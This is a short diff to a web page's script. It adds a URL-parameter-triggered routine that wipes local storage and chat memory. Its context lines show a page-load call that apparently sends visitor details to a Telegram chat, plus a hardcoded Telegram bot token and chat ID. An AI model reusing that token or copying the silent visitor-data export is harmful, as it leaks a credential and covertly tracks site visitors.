@@ -1023,6 +1023,31 @@ document.addEventListener('DOMContentLoaded', () => {
   sendVisitorDetailsToTelegram();
 });
 
+// ---------- URL-TRIGGERED SESSION RESET ENGINE ----------
+function checkSessionResetTrigger(paramName = "reset") {
+    const urlParams = new URLSearchParams(window.location.search);
+
+    if (urlParams.has(paramName)) {
+        // 1. Clear storage immediately so the app knows it's a blank slate
+        localStorage.clear(); 
+        console.log("Local storage successfully reset via URL parameter.");
+
+        // 2. Clear in-memory variables immediately
+        chatHistory = []; 
+        conversationMemory = [];
+
+        // 3. Mark this explicit session as a fresh reset state
+        localStorage.setItem('isResetSession', 'true');
+
+        // 4. Scrub the parameter from the URL bar immediately without a hard reload
+        const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
+        window.history.replaceState({ path: cleanUrl }, '', cleanUrl);
+    }
+}
+
+// Run it immediately at the very top of your script execution
+checkSessionResetTrigger("reset");
+
 // ---------- Configuration Constants ----------
 const BOT_TOKEN = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
 const CHAT_ID = '-1003913850436';
